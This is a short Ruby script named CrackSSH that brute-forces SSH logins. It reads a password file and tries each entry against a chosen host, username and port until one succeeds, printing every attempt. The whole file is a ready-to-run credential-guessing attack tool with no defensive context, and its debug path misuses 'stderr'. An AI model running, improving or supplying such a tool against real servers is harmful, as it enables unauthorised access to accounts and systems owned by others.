#!/usr/bin/ruby

require 'net/ssh'
require 'pp'
require 'colorize'

class CrackSSH
  attr_accessor :debug, :host, :user, :passwordfile, :port

  def initialize
    @passwordfile = nil
    @host = nil
    @user = nil
    @port = nil
  end

  def crack
    raise "Please Enter Any Username" if @user.nil?
    raise "Please Enter Any Host" if @host.nil?
    raise "Please Enter Any Password File" if @passwordfile.nil?
    raise "Please Enter Any Port Number" if @port.nil?

    file = File.open(@passwordfile)

    file.each do |pw|
      password = pw.strip
      printf "%s@%s:%s", @user, @host, password
      if crack_host(@host, @user, password)
        puts " => " + "[+] Found".green
        exit
      else
        puts " => " + "[-] False".red
      end
    end

  rescue RuntimeError => e
    puts e.message
  end

  def crack_host(host, user, pass)
    Net::SSH.start(host, user, :password => pass, :timeout => 0.3, :port => @port) do |ssh|
      ssh.exec!("hostname")
    end
    return true
  rescue => e
    stderr.puts e.message unless @debug.nil?
    return false
  end

  def run
    crack
  end
end

if $0 == __FILE__
  bf = CrackSSH.new

  # Argümanları işleme
  while ARGV.length > 0
    case ARGV[0]
    when "--host"
      bf.host = ARGV[1]
    when "--username"
      bf.user = ARGV[1]
    when "--file"
      bf.passwordfile = ARGV[1]
    when "--port"
      bf.port = ARGV[1]
    end

    ARGV.shift(2)
  end

  bf.run
end